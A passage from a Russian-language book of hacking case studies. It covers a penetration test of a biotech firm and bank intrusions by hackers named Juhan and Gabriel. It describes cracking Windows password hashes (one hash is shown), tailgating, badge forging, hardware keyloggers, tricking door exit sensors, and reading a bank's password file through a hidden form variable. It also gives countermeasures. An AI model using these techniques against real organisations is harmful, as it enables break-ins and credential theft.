проберется внутрь, может чувствовать себя, как дома.  Проникнув в один из таких компьютеров, Дастин извлек все пароли для каждого пользователя и пропустил этот файл через программу l0phtCrack.   LOPHTCRACK   ЗА   РАБОТОЙ   На компьютере с ОС Windows пароли пользователей хранятся в зашифрованном виде (это обычно обозначается словом «hash» — мешанина) в области под названием SAM (Security Accounts Manager— управление безопасностью): пароли зашифрованы не в полном смысле этого слова, но с последующим перемешиванием «в одну сторону», что означает, что алгоритм шифрования может преобразовать текстовой пароль в зашифрованную форму, но не может вернуть зашифрованную форму обратно.  Windows содержит в S A M две версии «hash». Одна из них « L A N Manager hash» или L A N M A N , является старой версией, сохранившейся еще со времен до появления WindowsNT. Перемешивание LANMAN производится на основе заглавных букв пароля пользователя, который потом делится на две части из семи символов. Эту разновидность перемешивания гораздо легче разгадать, чем следующую версию N T L M ( N T Lan Manager), которая распознает и строчные буквы.  В качестве иллюстрации я приведу здесь реальный пример такого перемешивания для системного администратора одной из компаний, название которой я говорить не буду:  Administrator:500:AA33FDF289D20A799FB3AF221F3220DC:0AB C818FE05A120233838B9131F36BB1:::  Часть между двумя двоеточиями, которая начинается с «АА33» и заканчивается «20DC» — это LANMAN-перемешивание. Часть от «0АВС» до «6ВВ1» — это NTLM-перемешивание. Оба имеют длину в 32 символа, оба представляют собой один и тот же зашифрованный пароль, но первый легче расшифровать.  Поскольку большинство пользователей выбирают пароль, который является именем или простым словом, атакующие начинают обычно с запуска l0phtCrack (или другой программы, которую они используют) для проведения «словарной атаки» — проверки всех слов из словаря, не выбраны ли они в качестве пароля. Если эта первая попытка не увенчивается успехом, то программа переходит к «атаке грубой силы», когда перебираются все возможные сочетания букв (например, A A A , А А В , А А С … A B A … ABB, ABC и т.д.), затем пробуются всевозможные сочетания заглавных и строчных букв, цифр и символов.  Такая эффективная программа, как l0phtCrack может взламывать простые, очевидные пароли (которые используют более 90% всех пользователей компьютеров) буквально за секунды. Раскрытие более сложного пароля может занять часы или даже дни, но практически все пароли в конце концов поддаются.   ДОСТУП   Вскоре Дастин раскрыл большинство паролей. «Я попробовал войти в первичный контроллер домена с паролем администратора, и это сработало. Они использовали один и тот же пароль на одном из компьютеров и в доменном аккаунте. Теперь у меня были права администратора во всем домене».  Первичный контроллер домена (PDC — primary domain controller) поддерживает главную базу данных всех пользовательских аккаун-тов. Когда пользователь входит в домен. PDC авторизирует его запрос с помощью информации, хранящейся в базе данных PDC. Эта база данных всех аккаунтов копируется в BDC (Backup domain controller — контроллер копирования домена) в качестве предосторожности на случай выхода из строя PDC. Эта архитектура существенно изменилась с выпуском Windows 2000. Более поздние версии Windows используют то, что у них называется «Активная директория», но для обратной совместимости с более старыми версиями Windows, у них есть по крайней мере одна система, которая действует как PDC для домена.  В руках Дастина были ключи от «королевства» Biotech, он получил доступ ко многим внутренним документам с пометкой «конфиденциально» или «только для внутреннего пользования». Интенсивно трудясь, Дастин провел долгие часы за сбором важной информации из секретных файлов о безопасности лекарств, где содержалось подробное описание побочных эффектов, вызываемых лекарствами, которые компания исследовала в то время. Доступ к этим файлам очень строго регулировался комитетом по контролю над лекарствами и продуктами питания, поэтому о проникновении в них в процессе проведения проверок должен был быть составлен специальный доклад для этого правительственного агентства.  Дастин получил доступ и к базе данных сотрудников, где содержались их полные имена, адреса электронной почты, телефонные номера, места работы, должности и т.п. Используя эти сведения, он мог выбрать мишень для следующей фазы атаки. Он выбрал системного администратора компании, который контролировал проведение проверок. «Я подумал, что хотя у меня уже было достаточно важной информации, надо показать им, что атака может идти в самых разных направлениях», то есть, что есть более одного пути для добычи информации.  Команда Callisma давно поняла, что если вы хотите проникнуть в охраняемую область, нет лучше метода, чем смешаться с группой разговаривающих сотрудников компании, возвращающихся с обеда. В отличие от утренних и вечерних часов, когда люди бывают раздраженными и усталыми, после обеда они всегда терпимы и расслаблены, чувствуя некоторую заторможенность, пока организм переваривает съеденный обед. Все разговоры доброжелательны, этим настроением буквально наполнена атмосфера. Любимый прием Дастина заключается в том, чтобы заметить кого-то, выходящего из кафе. Он идет впереди «жертвы» и пропускает его перед собой у самой двери. В девяти случаях из десяти, даже если эта дверь ведет в охраняемое помещение, «жертва» делает ответный жест и придерживает дверь. позволяя ему пройти вместе с собой. И он входит безо всяких проблем.   ТРЕВОГА   После того, как мишень для атаки была выбрана, команда должна была выбрать способ физического проникновения в охраняемые помещения, чтобы иметь возможность прикрепить к выбранному компьютеру «фиксатор текстов» — устройство, которое фиксирует любую нажатую на клавиатуре кнопку, даже первые нажатия запуска компьютера перед загрузкой ОС. На компьютере системного администратора это помогло бы перехватить пароли для целого ряда систем в сети. Это означало бы и то, что проверяющие были бы в курсе всей переписки о попытках отследить их действия.  Дастин решил не рисковать и не заниматься прямым наблюдением за руками администратора, чтобы не быть пойманным. Пришлось прибегнуть к методам социальной инженерии. Проведя много времени в кафетерии и приемной, он хорошо рассмотрел бейдж сотрудника и решил сделать для себя такой же поддельный. С логотипом проблем не было — он просто скопировал его с Интернет-сайта компании и встроил в свой рисунок. Важно было, чтобы к его бейджу особо не приглядывались.  Некоторые офисы Biotech располагались в соседнем здании, где кроме них были и офисы других компаний. В приемной всегда находился охранник, включая ночное время и выходные дни, и обычный «карт-ридер» (электронный считыватель), который открывал дверь из приемной, когда сотрудники вставляли в него свои бейджи с правильным электронным кодом.  «В один из выходных я зашел туда и начал вставлять мой самодельный поддельный бейдж в карт-ридер. Он, естественно, не срабатывал.  Охранник подошел и, улыбаясь, своим бейджем открыл мне дверь. Я улыбнулся ему в ответ и прошел в дверь».  Не промолвив ни слова, Дастин успешно был пропущен охранником в охраняемый офис.  Однако перед офисом Biotech дверь была снабжена еще одним «карт-ридером». Народу в помещении не было.  «Не было видно никого, за кем можно было бы пристроиться и пройти. В поисках другого прохода я отправился к застекленной лестнице, которая вела на второй этаж, и решил попробовать пройти туда. Дверь открылась без проблем, для этого не потребовался бейдж. И вдруг во всем здании зазвучал сигнал тревоги. Случайно я попал на пожарную лестницу. Я прошел, и дверь захлопнулась за мной. На ее внутренней стороне я прочел надпись „Не открывайте эту дверь, раздастся сигнал тревоги“. Мое сердце забилось со скоростью двести ударов в минуту!».   ПРИЗРАК   Дастин точно знал, в какую комнату ему надо попасть. В базе данных сотрудников, до которой проверяющие уже добрались. было указано место работы каждого сотрудника. Сигнал тревоги еще продолжал звучать в его ушах, но он направился к нужному месту.  Атакующий может получить информацию обо всех клавишах, нажимаемых на компьютере «жертвы», установив специальную программу, которая будет фиксировать каждый нажатый символ и периодически посылать электронное письмо с набранной информацией на определенный адрес. Однако, демонстрируя клиентам их уязвимость с разных сторон, Дастин хотел проделать ту же самую вещь физическими средствами.  Для этой цели он выбрал устройство под названием «ключ-призрак». Это устройство совершенно невзрачного вида, которое встраивается в соединение от клавиатуры к компьютеру и благодаря своим миниатюрным размерам практически всегда остается незамеченным. Такое устройство может запомнить до полумиллиона нажатий клавиш, что для типичного пользователя эквивалентно неделям работы. (Остается, правда, еще одна проблема: атакующему нужно еще раз прийти на то же место, чтобы вынуть «ключ-призрак» и прочесть его содержимое).  Дастину потребовалось несколько секунд для того, чтобы отключить кабель, соединяющий клавиатуру с компьютером, встроить в него «ключ-призрак» и присоединить кабель заново. Он старался убраться побыстрее. «Прозвучал сигнал тревоги, отсчет времени пошел, и мои руки немного тряслись. Я был близок к тому, чтобы быть пойманным. Ничего особенно плохого случиться не могло, потому что у меня была „индульгенция“, но даже и в такой ситуации адреналин во мне так и бурлил».  Установив «ключ-призрак», Дастин направился к лестнице, которая вывела его к посту безопасности. Для выхода пришлось применить еще одну порцию социальной инженерии.  «Я преднамеренно вышел из двери рядом с постом безопасности, вместо того, чтобы прятаться от охранника во время выхода, я направился прямо к нему. Я сказал: „Ради Бога извините, но это я вызвал весь этот переполох. Я еще никогда не работал в этом здании и не знал, что здесь все так устроено, прошу прощения“. Охранник спокойно сказал: „Нет проблем“.  Затем он взял трубку телефона, я полагаю, он позвонил кому-то, когда включился сигнал тревоги, теперь он предупреждал, что это была ложная тревога. Я уже не слышал их разговора».   БЕЗ   ПРОБЛЕМ   Проверки близились к концу. Ответственные за безопасность в компании были вполне уверены в том, что проверяющие не смогут проникнуть в сеть или в офисы компании, никто из них не был задержан. Дастин очень постепенно поднимал «уровень активности», делая их присутствие все более и более заметным. Никакой реакции.  Забавляясь тем, как много они могли бы забрать, некоторые проверяющие входили в офисы компании, следуя за ее сотрудниками и волоча за собой огромные антенны, — при этом всячески демонстрируя, как их утомило это занятие. Некоторые сотрудники замечали все это, но наблюдали за происходящим, насвистывая.  Итак, безо всяких документов проверяющие всего за три часа проникли в первое, а потом и во второе охраняемое здание Biotech. Никто не сказал им ни единого слова. Никто даже не поинтересовался «А что это за штука?» Самой сильной реакции они дождались от охранника, который проводил их к двери, посмотрел на них недовольным взором и пошел на свой пост, даже не оборачиваясь.  Группа Callisma пришла к выводу, что в большинстве компаний любой человек с улицы с любым оборудованием в руках может безнаказанно бродить по зданию, при этом его никто не остановит, не попросит документов и не потребует объяснить своего поведения. Дастин с коллегами без малейших проблем делали, что им было угодно.   ТРЮК   С   ОБОГРЕВАТЕЛЯМИ   РУК   REX (Request to Exit) — это обычная функция у выходных дверей многих компаний, таких как Biotech. В охраняемых помещениях, таких как исследовательская лаборатория, когда вы приближаетесь к выходу, то движение или тепло вашего тела приводят к срабатыванию определенных сенсоров, которые автоматически открывают дверь, так что вы можете выйти без малейшего затруднения: это особенно удобно для сотрудников, когда они тащат тяжелый прибор или поднос с пробирками. А вот чтобы попасть в ту же комнату снаружи. уже необходимо открыть замок с помощью электронного бейджа или набора цифр на специальном замке.  Дастин заметил, что целый ряд дверей в офисах Biotech с функцией REX имели внизу щель. Он задумался над тем, не удастся ли ему войти, обманув сенсоры. Если, находясь снаружи двери, он сможет имитировать тепло тела или движение, то сенсор будет обманут и дверь откроется.  «Я купил несколько обогревателей для рук, которые можно найти в любом универмаге. Их обычно носят в карманах верхней одежды, чтобы согревать руки в холодное время года. Я разогрел один, потом прикрепил его к прочной проволоке, подсунул под дверь и начал двигать взад и вперед, стараясь подвинуть поближе к сенсору. Как и следовало ожидать, замок открылся».  Вот и еще одна мера безопасности утратила смысл.  Я и сам делал нечто подобное в недалеком прошлом. Для того, чтобы открыть дверь при помощи сенсора, реагирующего не на тепло, а на движение, надо просунуть под дверь шарик, затем надуть его гелием, предварительно привязав к нитке, а затем двигать этот шарик вверх и вниз около сенсора. Этот простейший фокус открывает двери так же успешно, как и обогреватель рук у Дастина.   КОНЕЦ   ПРОВЕРОК   «Свет в Biotech горел, но никого не было дома». Хотя ИТ-руковод-ство компании утверждало, что у них действует специальная система обнаружения вторжений, и у них есть даже несколько лицензий на использование подобных систем, Дастин считает, что системы либо не были не включены, либо ни одна из них реально ничего не проверяет.  По мере приближения проверок к концу «ключ-призрак» надо было извлекать из компьютера системного администратора. Он стоял там две недели и не был обнаружен. Поскольку устройство было расположено в одном из таких мест, куда сложнее всего проскользнуть за входящим. Дастин с коллегами решили действовать иначе. В самом конце обеденного перерыва они придержали дверь, как будто кто-то к ней стремительно направлялся. По сути дела это был единственный сложный момент на протяжении всего периода проверок. Сотрудник, открывший дверь своим бейджем, спросил, кто они такие, Дастин показал ему свой фальшивый бейдж и тот был полностью удовлетворен. Они не выглядели испуганными или взволнованными, поэтому сотрудник спокойно пошел в здание, а они двинулись туда, куда им было нужно, без дальнейших затруднений.  После проникновения в охраняемое помещение они направились в комнату для переговоров. Там на стене висел большой плакат со знакомой терминологией. Они поняли, что попали в комнату, где сотрудники Biotech проводили свои совещания по безопасности в области информационных технологий. Естественно, посторонние в эту комнату попадать не должны были. В этот момент их работодатель зашел в комнату и с удивлением уставился на них. Он спросил, что они здесь делают. Тем временем и другие сотрудники безопасности Biotech вошли в эту комнату, среди них был и тот, с помощью которого они проникли в здание.  «Он заметил нас и сказал начальнику: „Я как раз хотел сказать вам, что я заметил их по пути сюда и спросил, кто они такие“. Парень был чертовски горд тем, что спросил нас. Главное разочарование заключалось в том, что одного этого вопроса было явно недостаточно для того, чтобы убедиться в нашей легитимности».  Пришел в комнату и администратор, в чей компьютер был установлен «ключ-призрак». Дастин воспользовался этой возможностью, пошел к его компьютеру и вынул свой прибор.   ОГЛЯДЫВАЯСЬ   НАЗАД   Самое удивительное, что в процессе проверок, когда Дастин с коллегами бороздили сеть компании вдоль и поперек, никто не заметил их присутствия. Несмотря на их поведение, которое Дастин характеризует, как «шум и крики», ни один из сотрудников компании не заметил их атак. Даже «громкое» сканирование сети для выявления потенциально уязвимых систем не было замечено.  «В конце проверок мы запускали свое сканирование, используя ресурс этой сети. Это было аналогично тому, как если бы мы кричали: „Эй, схватите нас!“  Проверяющие были просто потрясены тем, насколько пассивно вели себя представители компании, хотя они все знали, что команда хакеров будет прорываться в их сеть.  «Образно говоря, мы били в колокола, кричали, шумели, свистели и строили рожи. Никакой реакции! Ни одного сигнала тревоги. Это был просто блеск. Это была моя самая выдающаяся проверка за всю историю».   АНАЛИЗ   Каждый, кто задумывался об этических аспектах работы консультантов в области безопасности, чья работа связана с проникновением (в буквальном и переносном смысле) в места, куда им не следует заглядывать, сочтет деятельность Mudge и Дастина просветительской.  Тогда как Mudge использовал в основном технические методы в описанных им атаках, Дастин активно пользовался методами социальной инженерии. Правда, он не чувствовал себя в них экспертом. Он не испытывал никаких неудобств с техническими аспектами проверок и даже получал удовольствие от них. А вот когда ему приходилось обманывать людей, глядя им в глаза, он чувствовал некоторую неловкость.  «Я пытался осознать, почему так происходит. Почему одно меня раздражает, а другое н е т ? Вероятно, э т о связано с тем, что н а с учили не лгать людям, н о никто никогда н е у ч и л компьютерной этике. В с е с о г л а с я т с я с тем, что гораздо комфортнее дурачить компьютер, чем обманывать реального человека».  Тем не менее, несмотря на чувство неловкости, он регулярно ощущал выброс адреналина, когда совершал акции социальной инженерии.  Что касается Mudge, я думаю, главное то, что в области взлома паролей он был истинным экспертом и написал популярную программу для этого. Во всех других областях он использовал методы, доступные каждому хакеру.   КОНТРМЕРЫ   Mudge обнаружил правило работы межсетевого экрана, которое делало возможным соединение с любым TCP или UDP портом (с номерами выше 1024) любого пакета, исходящего из порта 53, который служит портом для DNS. Используя эту возможность, он смог вступить во взаимодействие с сервисом на компьютере-мишени, который случайно дал ему доступ к району загрузки, где он сумел удаленно загрузить файловую систему. Сделав это, он получил доступ к важной информации.  В качестве контрмеры необходимо тщательно проверить все правила межсетевого экрана, чтобы убедиться в том. что они соответствуют политике безопасности компании. Проводя проверку, надо всегда помнить, что любой человек может легко подделать номер порта-источника.  По этой причине межсетевой экран надо конфигурировать так, чтобы он разрешал соединяться только со специфическими сервисами на базе определенного набора портов.  Как не раз уже отмечалось в этой книге, очень важно убедиться, что все директории и файлы снабжены соответствующими разрешениями.  После того, как Mudge с коллегами благополучно проникли в систему, они установили программу-«вынюхиватель», чтобы захватывать имена пользователей и пароли. Эффективной контрмерой против этого может стать использование программ, основанных на криптографических протоколах, таких как ssh.  Во многих организациях есть специальные оборонные стратегии, касающиеся паролей или других способов авторизации для доступа к компьютерным системам, но о телефонных станциях или системах голосовой почты мало кто думает. Именно поэтому команда l0pht легко взломала несколько паролей на ящиках голосовой почты, принадлежащих руководителям компании, которые использовали совершенно банальные пароли типа 1111, 1234 или нечто подобное. Очевидная контрмера — это использование в системе голосовой почты разумных паролей. (Убедите сотрудников не использовать АТМ-соединение!).  Для компьютеров, содержащих важную информацию, очень рекомендуется метод конструирования паролей, описанный в главе, с использованием специальных непечатных символов, создаваемых с помощью Num Lock, ключа <Alt>и цифр.  Дастин смог свободно зайти в комнату переговоров компании Biotech, поскольку она была расположена в общедоступном месте. При этом в комнате был разъем для подключения, который соединял вас с внутренней сетью компании. Такие разъемы надо либо удалять, либо отделять внутреннюю сеть от таких общедоступных мест. Еще одна возможность — это внешняя система авторизации, которая требует для входа правильного имени пользователя и пароля перед тем. как разрешить доступ.  Один из способов снизить вероятность проникновения в помещения компании — это изменить то, что социальные психологи называют нормами вежливости. При помощи специальных тренировок надо научить сотрудников компании преодолевать психологический дискомфорт, который большинство из нас чувствует, спрашивая незнакомого человека без бейджа на территории компании, что он здесь делает и кто он такой. Сотрудников надо просто научить, как задавать подобные вопросы вежливо, особенно в тех случаях, когда ясно, что человек старается прорваться внутрь охраняемого помещения, Правило должно быть очень простым: если у человека нет бейджа, то отправляйте его к секьюрити, но никогда не позволяйте подобным типам проникнуть на территорию компании.  Изготовление фальшивых бейджей компании — очень простой способ для проникновения в помещение компании, которое считается защищенным. Даже охранники далеко не всегда рассматривают бейдж достаточно пристально, чтобы успеть разобраться — настоящий он или поддельный. Подделывать их станет труднее, если в компании будет введено правило (и будет отслеживаться его соблюдение!), что все сотрудники, работающие постоянно и по контракту, будут прятать свои бейджи, покидая помещение компании, лишая потенциальных злоумышленников возможности изучить их в подробностях.  Мы прекрасно знаем, что охранники никогда не будут изучать бейджи сотрудников слишком внимательно (что, кроме всего прочего, просто невозможно, когда в начале и в конце рабочего дня у проходной выстраивается вереница сотрудников). Поэтому нужны другие методы защиты от нежелательных пришельцев. Более высокую степень защиты обеспечивают электронные считыватели карточек. Но охранника надо научить задавать вежливые вопросы тем, чья карточка не распознается этим считывателем. Как произошло в только что рассказанной истории, проблемой может быть не ошибка считывателя, а попытка атакующего проникнуть в охраняемое помещение.  Тренировки сотрудников компании в области безопасности становятся все популярнее, но им не хватает последовательности. Даже в компаниях с очень обширными подобными программами недооценивается необходимость специальной подготовки менеджеров для контроля над всеми их подчиненными. Компании, где сотрудники не проходят специальных тренировок — это компании со слабой безопасностью.   ПОСЛЕСЛОВИЕ   Не так часто читателям предоставляется возможность заглянуть в «творческие лаборатории» тех, кто внес значительный вклад в арсенал хакерских средств. Имена Mudge и l0phtCrack начертаны на скрижалях истории.  С точки зрения Дастина Дюкса из Callisma компании, которые просят провести у них проверку безопасности, часто идут наперекор своим собственным интересам. Вы никогда не узнаете, насколько уязвима ваша компания, пока не разрешите провести у вас полномасштабную проверку безо всяких ограничений, включая методы социальной инженерии и физического проникновения в сочетании с техническими атаками.       Глава 7.    Вы   уверены  ,   что   ваш   банк   безопасен  ,   не   правда   ли  ?      Если вы хотите защитить вашу систему от «дурака», то всегда найдется один такой, изобретательность которого вы и предвидеть не могли.  Юхан   Даже зная о том, что многие организации не предпринимают необходимых мер по обеспечению своей безопасности, чтобы закрыть все двери перед хакерами, мы склонны думать, что уж наши-то деньги находятся в безопасном месте, так что никто не может добраться до нашего банковского счета или даже (совсем уж жуткий бред!) перевести деньги с него себе в карман.  Плохая новость заключается в том, что безопасность во многих банках и других финансовых организациях не так хороша, как думают об этом люди, ответственные за нее. Следующие истории иллюстрируют это утверждение.   В   ДАЛЕКОЙ   ЭСТОНИИ   Мы расскажем о том, что любой человек, даже не хакер, может проникнуть в банк. Это плохая новость как для банков, т а к и для любого из нас.  Я никогда не был в Эстонии, может даже никогда и не попаду туда. Это название ассоциируется у нас с древними замками, окруженными темными лесами и колоритными крестьянами — в общем, с такими местами, куда путешественнику не следует отправляться без достаточного запаса осиновых колов и серебряных пуль. Это невежественное представление (укрепившееся благодаря малобюджетным фильмам ужасов, снятым в лесах и замках Восточной Эстонии) совсем не соответствует действительности.  На самом деле все обстоит иначе. Эстония гораздо более современная страна, чем я представлял себе. Я узнал это от хакера по имени Юхан. который живет там. Двадцатитрехлетний Юхан живет в центре города, один в просторной четырехкомнатной квартире с «действительно высокими потолками и красивыми стенами».  Эстония, как я узнал, — совсем небольшая страна с населением 1,3 миллиона человек (это примерно население такого города, как Филадельфия), расположенная между Россией и Финским заливом. Таллинн, столицу Эстонии, до сих пор уродуют унылые коробки многоквартирных домов, неряшливые памятники тому, как канувшая в Лету Советская империя пыталась дать своим гражданам максимально экономичное жилье.  Юхан жаловался: «Когда люди хотят узнать что-то об Эстонии, они иногда спрашивают: „Есть ли у вас врачи? Есть ли у вас университет?“ А ведь 1 мая 2004 года Эстония стала членом Евросоюза». Многие эстонцы, по его словам, работают изо всех сил, чтобы перебраться из старых квартир советских времен в небольшие собственные коттеджи в тихом пригороде. Они мечтают о том моменте, когда смогут сесть за руль «надежной иномарки». На самом деле, у многих уже есть автомобили и все больше людей перебираются в собственные дома, «ситуация улучшается каждый год». И в технологическом смысле страна также не является отсталой, как объясняет Юхан.  «Еще в начале девяностых годов Эстония начала внедрять у себя инфраструктуру электронных банков, ATM и Интернет-банкинг. Это очень современные технологии. На самом деле эстонские компании предоставляют компьютерные технологии и услуги другим европейским странам».  Вы, может, вообразили себе некий хакерский рай — повсеместный Интернет и неадекватное отношение к безопасности? По словам Юхана, дело обстоит совсем не так.  «Что касается Интернет-безопасности, то здесь все обстоит хорошо, благодаря тому, что размеры страны и коммуникаций невелики. Для поставщиков услуг здесь очень удобно внедрять новые технологии. Что касается финансового сектора, я думаю, что на возможность налаживания связей с Америкой повлиял и тот факт, что здесь никогда не было традиции использования банковских чеков, с помощью которых вы привыкли расплачиваться в магазинах».  По его словам, очень мало эстонцев вообще имело представление о том, что это такое: «большинство людей имеют счета, но не представляют себе, как выглядит банковский чек». Совсем не потому, что их не интересуют финансовые проблемы, а потому, что, по крайней мере, в этой сфере они находятся впереди Америки, объясняет Юхан.  «У нас никогда не было развитой банковской инфраструктуры. Уже в начале девяностых годов мы начали внедрять электронный и Интернет-банкинг. Подавляющее большинство населения и предпринимателей переводят деньги друг другу при помощи Интернет-банкинга».  По европейской терминологии, они пользуются кредитными или банковскими карточками.  «Гораздо удобнее расплачиваться при помощи банковской карточки или Интернет-банкинга, поэтому у людей нет причин пользоваться чеками. В отличие от Америки, почти каждый здесь использует Интернет для осуществления банковских операций и оплаты своих счетов».   БАНК   PEROG  I  E   Юхан серьезно занимается компьютерами, начиная с десяти лет, но он не считает себя хакером, а лишь офисным работником, серьезно думающим о безопасности. Общаться с ним очень легко: английский язык он начал учить со второго класса школы. Ему посчастливилось много путешествовать и учиться за рубежом, что дало ему возможность и дальше совершенствовать свой английский.  Не так давно в Эстонии была очень суровая зима, почти с полярной погодой: всюду намело сугробы, температура опускалась до минус 25 градусов по Цельсию. Стояли такие морозы, что даже местные жители, которые привыкли к холодным зимам, не выходили из дома без особой необходимости. Для любителей компьютеров это был прекрасный повод безвылазно сидеть перед своими мониторами в поисках чего-нибудь поистине достойного их внимания.  Одним из них был Юхан, Он набрел на Интернет-сайт, который мы будет называть банком Perogie. Этот сайт выглядел вполне достойной мишенью.  «Я зашел в интерактивный раздел часто задаваемых вопросов и ответов — F A Q — в котором можно было задавать вопросы. У меня е с т ь привычка листать страницы Интернет-сайтов — без особой цели, просто ради любопытства».  Он заметил, что файловая система организована так. как это принято в Unix-системах, Это сразу же очертило круг атак, которые он мог проводить. Просматривая коды источников некоторых Интернет-страниц, он обнаружил скрытые переменные, которые указывали на определенное имя файла. Когда он попытался изменить значение этой скрытой переменной, «стало ясно, что никто не спрашивает у него никакой авторизации. Это означало, что для банковского сервера нет никакой разницы — приходит ли к нему запрос с Интернет-сайта банка или с обычного компьютера».  Он изменил параметры спрятанного элемента, указывающего на файл паролей, что позволило ему вывести этот файл паролей к себе на экран. Он обнаружил, что пароли не «замаскированы», что означает, что стандартная зашифрованная форма каждого пароля была видна на экране. Таким образом он смог скопировать зашифрованные пароли и пропустить их через свой «взламы-ватель» паролей.  Этот «взламыватель» был хорошо известной программой с забавным названием «Джон Потрошитель» (John the Ripper), который Юхан запускал, используя стандартный английский словарь. Почему английский, а не эстонский? «Здесь в качестве паролей обычно используются английские слова». Немаловажно и то, что многие эстонцы неплохо владеют английским языком.  «Взламыватель» паролей работал всего 15 минут на его компьютере — пароли были совсем простые, английские слова с несколькими цифрами, добавленными в конце. Один из этих паролей был настоящей драгоценностью: это был корневой пароль, который давал ему привилегии администратора. Более того:  «Есть один сервис удаленного банкинга (не думаю, что надо упоминать его имя здесь), аккаунт которого я обнаружил. Получалось так, что на этом сервере расположена система, реализующая эту услугу».  Он не стал развивать свой успех в этом направлении, объясняя, что «получение паролей — это тот предел, где я останавливаюсь». Благоразумие — вот девиз его игры.  «Я мог попасть в передрягу. В конце концов, я работаю в бизнесе информационной безопасности. У меня были свои резоны не причинять никому вреда.  В с е складывалось слишком хорошо, чтобы быть правдой. Я стал подозревать, что это ловушка (вроде горшка с медом) для заманивания людей, подобных мне, чтобы потом наказывать их. Поэтому я доложил об этом своим начальникам, а они передали информацию о моей находке в банк».  Его открытие не повредило взаимоотношениям ни с его работодателем, ни с банком, наоборот. Его компании предложили продолжить исследования дальше и предложить решение для того, чтобы залатать эту дыру. Компания Юхана поручила эту работу ему, полагая, что он может закончить то, что уже начал.  «Меня удивило то, что события развивались именно так, поскольку ситуация с Интернет-безопасностью в Эстонии обстоит гораздо лучше, чем в любом другом месте. Это не мой личный вывод, а мнение многих людей, которые приехали сюда из самых разных мест. Поэтому я с удивлением обнаружил эту лазейку, и то, как легко мне удалось добраться до очень секретной информации».   ЛИЧНОЕ   МНЕНИЕ   После подобных опытов Юхан пришел к выводу, что в собственных интересах компании, в систему которой проник хакер, не наказывать его. а наоборот — работать с ним вместе, чтобы устранить возникшие проблемы — стратегия типа: «если движение нельзя остановить, надо попытаться его возглавить». К сожалению, правительственные организации не так относятся к этой проблеме, как доказал случай с задержанием Адриана Ламо (описан в Главе 5), заключенного под стражу, несмотря на тот факт, что он (в большинстве случаев) предоставлял услуги компаниям, сообщая им об их уязвимости. Наказание — это всегда решение, при принятии которого проигрывают обе стороны, особенно если компания не получает информации о тех лазейках, которые использовал хакер при проникновении в ее сеть.  В качестве проверки «рефлекса коленной чашечки» можно использовать межсетевые экраны и другие методы защиты, но этот подход не учитывает те невидимые лазейки, которые может найти опытный хакер, не говоря уже о всех тех, что хорошо известны хаке-рскому сообществу. Юхан выразил свое отношение к этому в такой сентенции:  «Если вы хотите защитить вашу систему от „дурака“, то всегда найдется один такой, изобретательность которого вы и предвидеть не могли».   ПРОНИКНОВЕНИЕ   В   БАНК   ИЗДАЛЕКА   Габриэль говорит по-французски и живет в маленьком канадском городе. Он считает себя серьезным хакером и не любит наносить вред, но признает, что «делал это раз или два, когда доходил до крайней степени отчаяния» или когда находил сайт «с таким позорным уровнем безопасности, что им просто необходимо было дать урок».  Но каким же образом парень из провинциальной Канады смог ограбить банк на юге США? Он нашел сайт, который показывал «все Интернет-компании и всех владельцев местных сетей». Он искал там список, «где встречались бы слова правительство, банк или нечто подобное» и обнаружил некоторые IP-адреса (например, от 69.75.68.1 до 69.75.68.254), которые затем отсканировал.  Один из адресов, которые он проверял, оказался IP-адресом, который принадлежал местному банку в самом центре района Dixie. С этого началась серьезная хакерская акция Габриэля.   ХАКЕРАМИ   НЕ   РОЖДАЮТСЯ  ,   ХАКЕРАМИ   СТАНОВЯТСЯ   В возрасте пятнадцати лет (что, как вы уже поняли из наших предыдущих глав, можно назвать поздним стартом, — как если бы вы начинали играть в баскетбол в старших классах школы и мечтали при этом попасть в высшую баскетбольную лигу) Габриэль начинал с игр типа Doom на своем 386-м компьютере с жестким диском на 128 Мб и постепенно перешел к первым попыткам хакерства. Когда его компьютер стал слишком медленным для его забав, он перешел к сетевым играм в местном интернет-кафе.  Мир компьютеров был приятной отдушиной в жесткой борьбе за выживание в старших классах школы, где Габриэлю ежедневно приходилось терпеть насмешки от соучеников просто потому, что он был не таким, как они. Мало того, что он был новичком, он вдобавок был и самым младшим в классе, в который поступил из-за переезда семьи. Не каждый понимает, как нелегко быть изгоем.  Его родители, оба работавшие на правительство, не могли понять странную тягу их сына к электронике, но эта общая проблема для поколения, выросшего в период взрывного роста технологий. «Они никогда не хотели купить мне компьютер», — вспоминает он. Они всегда хотели, чтобы «я бросил это и занимался чем-то другим». Они так «заботились» о своем сыне, что отправили его к психологу, чтобы привести его в «нормальное состояние». Чтобы ни происходило во время этих сеансов, это не смогло остудить его юношескую страсть к компьютерам — как и следовало ожидать.  Габриэль прошел специальные курсы компании Cisco в местном колледже. Он вырос самоучкой, и обычно знал куда больше своих преподавателей, которые часто доверяли ему проводить объяснения самых сложных мест курса. Сегодня Габриэлю двадцать один год, и у него настолько яркий хакерский талант, что он самостоятельно может делать открытия. Даже когда он совершает хорошо известную последовательность действий, они окрашены его необычным дарованием, как будто он пришел из иного мира в отличие от всяких там «детей текстов», которые ничего не создают сами, а перегружают в свои головы готовые знания из Интернета.  Одна из его любимых программ называется Spy Lantern Keylogger. Это одна из тех программ, которые позволяют замаскировать действия хакеров, и позволяет последним перехватывать все, что набирается на клавиатуре компьютера-мишени. — причем сама программа остается абсолютно невидимой.  В дополнение к этому он использовал функцию «маскировки» приложения под названием Citrix MetaFrame (программа корпоративного доступа по запросу), которая создана для того, чтобы дать возможность системным администраторам контролировать действия сотрудников компании и помогать им. Имея возможность замаскировать свои действия, системный администратор может скрытно наблюдать за пользователем «через плечо», видя все, что печатает и делает пользователь, и даже перехватывать управление его компьютером. Знающий хакер, который определил, что компания использует приложение Citrix, может сделать то же самое: получить контроль над компьютером. Это дело, естественно, требует большой осторожности. Если он не будет осторожным, то его хакерская активность будет замечена, поскольку любой работающий за этим компьютером увидит результаты его действий (перемещение курсора, открытие приложений и т.п.). Тем не менее, хакер получает возможность неплохо повеселиться.  «Я наблюдал за человеком, который писал электронное письмо жене или еще кому-то, а сам двигал его мышку по всему экрану. Очень забавно.  Однажды я проник в компьютер какого-то парня и начал двигать его курсор. Он открыл свой блокнот. Я напечатал там «Привет, дружок!»  Естественно, хакер, который стремится получить контроль над чьим-то компьютером, должен выбрать время, когда никого нет вокруг. «Я это обычно делаю после полуночи», — объясняет Габриэль, — «чтобы быть уверенным, что никого больше нет. Я иногда проверяю состояние экрана компьютера. Если работает „скринсейвер“, значит, никого за компьютером нет».  Однажды тот, за кем он наблюдал, заметил его. На экране Габриэля появились слова «Я знаю, 